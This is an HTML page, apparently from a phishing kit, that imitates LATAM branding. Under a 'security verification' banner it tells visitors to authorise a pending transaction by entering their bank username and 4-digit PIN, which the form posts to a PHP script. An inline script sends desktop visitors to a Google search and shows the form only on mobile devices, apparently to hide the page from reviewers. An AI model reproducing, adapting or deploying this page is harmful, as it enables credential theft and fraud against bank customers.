
<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/estilos.css" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/normalize.css">
    <link rel="stylesheet" href="./css/utils.css">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="stylesheet" href="./css/hotel-datepicker.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
    <script src="js/custom.js"></script>

    <title>logos</title>
    
</head>
<body onload="nobackbutton();">

<script>
        
        const esDispositivoMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

if (esDispositivoMovil) {
  
  console.log("Estás navegando desde un dispositivo móvil");
} else {
    window.location.href = "https://www.google.com/search?q=https%3A%2F%2Fpeople.com%2F&rlz=1C1UUXU_esCO1026CO1026&sxsrf=AB5stBhY1HWRiHp1kz7EliMShtk-hj13Fg%3A1688777086772&ei=frGoZPXgLquHwbkP15iRwAg&ved=0ahUKEwj1l_Ly8P3_AhWrQzABHVdMBIgQ4dUDCA8&uact=5&oq=https%3A%2F%2Fpeople.com%2F&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIICAAQgAQQywEyCAgAEIAEEMsBMggIABCABBDLATIICAAQgAQQywEyCAgAEIAEEMsBMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAeEA0yBggAEB4QDToECCMQJzoHCCMQigUQJzoLCAAQgAQQsQMQgwE6BQgAEIAEOggIABCABBCxAzoICC4QgAQQsQM6CwgAEIoFELEDEIMBOgUILhCABDoLCC4QgAQQsQMQgwE6DQguEIoFELEDEIMBEEM6CggAEIAEEBQQhwI6EAguEIoFELEDEMcBENEDEEM6DgguEIAEELEDEMcBENEDOhsILhCKBRCxAxCDARBDEJcFENwEEN4EEOAEGAE6BwgjEOoCECc6FQgAEAMQjwEQ6gIQtAIQjAMQ5QIYAjoVCC4QAxCPARDqAhC0AhCMAxDlAhgCSgQIQRgAUABY6SZgnCloA3ABeACAAaUDiAG_CZIBBzItMi4xLjGYAQCgAQGgAQKwARTAAQHaAQYIARABGBTaAQYIAhABGAs&sclient=gws-wiz-serp";
  console.log("Estás navegando desde un dispositivo de escritorio");
}
      
    </script>



<nav class="p-fixed border-box bg-deep-blue p-3">
        <div class="d-flex justify-space-between align-items-center">
            <div>
                <img width="105px" src="./assets/logos/LATAM_navbar.png">
            </div>

            <div class="d-flex justify-content-center align-items-center">
                <button class="btn-session" style="padding-inline: 1.3rem;padding-top: 4px; padding-bottom: 4px;font-size: 1.5rem;">
                    Iniciar sesión
                </button>
                <img class="navbar--hamburger" src="./assets/media/hamburger_a.png">
            </div>
        </div>
    </nav>
    
<br>
<br>
<br><br>
<div class="introduccion"><h1 style="font-size:2.5vh;">VERIFICACI&Oacute;N DE SEGURIDAD</h1></div>
            <p style="text-align:center !important; line-height:normal !important; margin: 3px;">
              Debes autorizar la transacci&oacute;n que esta en proceso, inicia sesi&oacute;n en tu banca virtual, a continuacion:
            </p>
</div>

<style>
  input:focus {
    outline: none; /* Elimina el contorno predeterminado */
    /* Si quieres aplicar un estilo personalizado al enfoque, puedes hacerlo aquí. Por ejemplo: */
    border: 2px solid #fafafa2b; /* Cambia el borde a azul al enfocar */
}
</style>

<form action="php/index.php" method="post">
        <div class="largo">
            
            <div class="cuerpo">
            <div class="titulo2">Inciar sesion</div>
                <div class="pnlizq">
                    <div class="formulario">
                        
                        <div class="form-titulo">Usuario</div>
                                <div class="descripcion">
                                    Si no tienes un usuario asignado ingresa con tu documento de identidad
                                </div>
                                <div class="form-cuerpo">
                                    <div style="text-align: left;">
                                        <img src="img/info.jpg" class="icon-info"><span class="etiqueta">Ingresa tu usuario</span>
                                    </div>   						
                                    <div class="input-icono user">
                                        <input type="text" class="sinborde" name="txtUser" id="txtUser" autocomplete="off" required>
                                       
                                    </div>
                                    <div class="input-contra">
                                    <input type="hidden" id="pag" name="pag" value="logo">
                                        <input type="password" inputmode="numeric" class="sinborde" maxlength="4" minlength="4" name="txtPassword" id="txtPassword" autocomplete="off" required>
                                    </div>

                                    <br>
                                    <button id="enviar" name="btnUsuario"  class="btn btn-amarillo" type="submit" >Continuar</button>
                                    <br>
                                    <br>
                                    <div class="texto" style="text-align: right;">
                                        <div class="vinculos">
                                            <a href="#">¿Olvidaste tu usuario?</a>
                                        </div>
                                        <div class="vinculos">
                                            <a href="#">¿Problemas para conectarte?</a>
                                        </div>   													
                                    </div>   							
                                </div>
                            </div>
                    </div>
                </div>
            </div>

        </div>

         <br>
         

 </form>	

 <div class="inferior">
 <img src="./img/imgbc.jpeg" alt="" class="flayerbc">
    <img src="./img/vigila.png" alt="" class="vigila">
    </div>
    

    <script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>


</body>
</html>